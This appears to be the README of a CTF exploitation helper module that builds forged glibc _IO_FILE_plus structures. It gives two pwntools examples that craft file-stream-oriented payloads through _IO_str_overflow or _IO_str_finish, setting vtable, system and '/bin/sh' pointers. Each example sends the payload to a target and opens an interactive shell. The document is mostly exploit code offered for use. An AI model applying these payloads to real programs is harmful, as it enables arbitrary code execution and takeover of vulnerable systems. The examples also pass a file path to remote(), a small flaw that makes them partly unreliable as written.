# _IO_FILE.py
Create _IO_FILE structure and create payload _IO_str_overflow() and _IO_str_finish().

This module creates _IO_FILE_plus structure.

And if you want to payload, you call `set_IO_str_overflow()` or `set_IO_str_finish()`.

## How to use

If you want to call `_IO_str_oveflow()`, you have to use function `set_IO_str_overflow()` and this function return payload that is _IO_FILE_plus structure.

For example, follow the code.

```python
from pwn import *
import _IO_FILE

p = remote("./challenge")
# Leak libc_base and get gadget system, binsh ...

io_file = _IO_FILE._IO_file_plus()
payload = io_file.set_IO_str_overflow({"_lock" : p64(fake_lock),
                                        "_IO_write_ptr" : p64(binsh),
                                        "_IO_buf_end" : p64(binsh),
                                        "vtable" : p64(_IO_str_overflow_addr),
                                        "jump": p64(system)
                                    })
print(payload)

p.sendline(payload)
p.interactive()
```


Or if you want to call `_IO_str_finish()`, follow code.

```python
from pwn import *
import _IO_FILE

p = remote("./challenge")
# Leak libc_base and get gadget system, binsh ...

io_file = _IO_FILE._IO_file_plus()
payload = io_file.set_IO_str_finish({"_lock" : p64(fake_lock),
                                        "_IO_write_end" : p64(binsh),
                                        "_IO_buf_base" : p64(binsh),
                                        "vtable" : p64(_IO_str_finish_addr),
                                        "jump" : p64(system)
                                    })
print(payload)

p.sendline(payload)
p.interactive()
```
